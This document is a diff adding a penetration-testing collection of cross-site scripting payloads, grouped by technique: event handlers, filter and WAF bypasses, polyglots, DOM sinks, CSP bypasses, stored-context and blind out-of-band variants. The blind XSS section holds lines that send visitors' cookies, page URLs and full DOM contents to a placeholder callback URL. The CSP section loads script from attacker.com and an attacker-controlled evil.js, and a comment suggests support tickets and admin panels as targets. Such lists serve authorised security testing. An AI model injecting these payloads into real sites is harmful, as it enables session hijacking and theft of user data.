@@ -1,0 +1,158 @@
+## ============================================================
+## XSS Payloads — Real-World VAPT Collection
+## ============================================================
+
+## ---- BASIC ----
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1) autofocus><input autofocus>
+<marquee onstart=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<iframe src="javascript:alert(1)">
+<iframe srcdoc="<script>alert(1)</script>">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
+
+## ---- EVENT HANDLERS ----
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert(1)">
+<img src=valid.jpg onload=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<video><source onerror=alert(1)>
+<marquee onstart=alert(1)>
+<isindex type=image src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<div onpointerover=alert(1)>hover</div>
+<div onpointerenter=alert(1)>hover</div>
+<form><button formaction=javascript:alert(1)>click</button>
+<xss onafterscriptexecute=alert(1)><script>1</script>
+<animate onbegin=alert(1) attributeName=x dur=1s>
+<set onbegin=alert(1) attributeName=x>
+
+## ---- FILTER BYPASS / ENCODING ----
+<ScRiPt>alert(1)</ScRiPt>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<img src=x onerror=alert&#40;1&#41;>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(1)>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<img/src=x onerror=alert(1)>
+<img%20src=x%20onerror=alert(1)>
+<img src=x onerror=alert`1`>
+<img src=x onerror=alert&lpar;1&rpar;>
+%3Cscript%3Ealert(1)%3C/script%3E
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+<script>alert(1)//
+<script>alert(1)<!--
+<<script>alert(1)//<</script>
+
+## ---- WAF BYPASS / POLYGLOTS ----
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+"><img src=x onerror=alert(1);//
+"><svg/onload=alert(1)//
+'"><img src=x onerror=prompt(1)>
+<math><mi//xlink:href="data:x,<script>alert(1)</script>">
+<table><tr><td><svg/onload=alert(1)>
+</title><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</style><script>alert(1)</script>
+</script><script>alert(1)</script>
+<a href="javascript:void(0)" onclick=alert(1)>click</a>
+<a href=javas%63ript:alert(1)>click</a>
+<a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>click</a>
+<svg><script>alert&#40;1)</script>
+<svg><animate xlink:href=#x attributeName=href values=javascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
+<math><mtext><img src=x onerror=alert(1)></mtext></math>
+<xmp><p title="</xmp><svg/onload=alert(1)>">
+
+## ---- DOM XSS SINKS ----
+# document.write sink
+javascript:document.write('<img src=x onerror=alert(1)>')
+# innerHTML sink
+"><img src=x onerror=alert(1)>
+# eval / setTimeout / setInterval sink
+';alert(1)//
+\';alert(1)//
+</script><script>alert(1)</script>
+# location / location.href / location.hash
+javascript:alert(1)
+#<img src=x onerror=alert(1)>
+# jQuery .html() / .append() / .prepend()
+<img src=x onerror=alert(1)>
+# postMessage handler
+{"type":"xss","data":"<img src=x onerror=alert(1)>"}
+# Angular template injection (older versions)
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+
+## ---- CSP BYPASS ----
+# JSONP endpoint (if allowed in CSP script-src)
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
+# base-uri not set
+<base href="https://attacker.com/">
+# object-src not set
+<object data="data:text/html,<script>alert(1)</script>">
+# Using allowed CDN with arbitrary JS upload
+<script src="https://cdn.jsdelivr.net/gh/attacker/repo/evil.js"></script>
+# data: URI (if data: allowed in script-src)
+<script src="data:text/javascript,alert(1)"></script>
+# Trusted Types bypass via default policy
+<script>trustedTypes.createPolicy('default',{createHTML:s=>s});document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+
+## ---- BLIND XSS (out-of-band) ----
+# Replace CALLBACK_URL with your XSS Hunter / Burp Collaborator / webhook.site URL
+"><script src=https://CALLBACK_URL></script>
+"><img src=x onerror="fetch('https://CALLBACK_URL?c='+document.cookie)">
+"><img src=x onerror="new Image().src='https://CALLBACK_URL?c='+document.cookie">
+'"><script>fetch('https://CALLBACK_URL',{method:'POST',body:JSON.stringify({cookie:document.cookie,url:location.href,dom:document.documentElement.innerHTML})})</script>
+"><iframe src="javascript:fetch('https://CALLBACK_URL?c='+document.cookie)">
+<script>var i=new Image();i.src='https://CALLBACK_URL/?c='+document.cookie;</script>
+# Good targets for blind XSS: user-agent, referer, contact forms, support tickets, admin panels, log viewers
+
+## ---- CONTEXT-SPECIFIC (STORED XSS) ----
+# Inside HTML attribute (double-quoted)
+" onfocus=alert(1) autofocus="
+" onmouseover=alert(1) x="
+" ><svg onload=alert(1)>
+# Inside HTML attribute (single-quoted)
+' onfocus=alert(1) autofocus='
+' ><svg onload=alert(1)>
+# Inside JavaScript string
+';alert(1)//
+\';alert(1)//
+</script><script>alert(1)</script>
+# Inside JavaScript template literal
+${alert(1)}
+`+alert(1)+`
+# Inside HTML comment
+--><script>alert(1)</script><!--
+# Inside SVG context
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
+<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>
+# Inside JSON output reflected in page
+</script><script>alert(1)</script>
+# Inside CSS
+</style><script>alert(1)</script>
+expression(alert(1))
+# Markdown (if rendered to HTML)
+[click](javascript:alert(1))
+![img](x" onerror="alert(1))
